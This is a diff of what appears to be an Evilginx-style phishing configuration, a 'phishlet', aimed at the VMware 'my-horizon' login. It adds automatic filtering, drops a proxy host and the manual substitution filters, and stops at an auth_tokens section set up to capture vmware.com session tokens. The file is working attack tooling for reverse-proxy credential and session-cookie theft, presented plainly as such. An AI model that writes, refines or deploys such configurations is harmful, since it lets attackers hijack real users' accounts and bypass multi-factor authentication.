@@ -4,12 +4,9 @@
 author: '@playswithfir3'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'my-horizon', orig_sub: 'my-horizon', domain: 'vmware.com', session: true, is_landing: true}
-  - {phish_sub: '', orig_sub: '', domain: 'vmware.com'}
+  - {phish_sub: 'my-horizon', orig_sub: 'my-horizon', domain: 'vmware.com', session: true, is_landing: true, auto_filter: true}
 
-sub_filters:
-  - {triggers_on: 'vmware.com', orig_sub: 'my-horizon', domain: 'vmware.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'my-horizon.vmware.com', orig_sub: 'my-horizon', domain: 'vmware.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+sub_filters: []
 
 auth_tokens:
   - domain: 'vmware.com'
